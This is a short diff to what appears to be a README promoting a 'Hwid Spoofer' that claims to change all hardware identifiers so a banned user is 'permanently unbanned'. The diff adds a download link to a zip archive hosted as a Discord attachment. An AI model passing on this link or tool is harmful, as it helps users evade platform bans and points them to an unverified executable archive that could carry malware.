@@ -15,3 +15,5 @@ The new modern Hwid Spoofer & change Your All hardware, Permanently Unbanned & a
 [ CHANGE ALL PC INFORMATION TO FRESH DEVICE  ]
 
 
+# Download Link 
+> >https://cdn.discordapp.com/attachments/992736780673617930/993572763958771762/Galaxy_1.zip
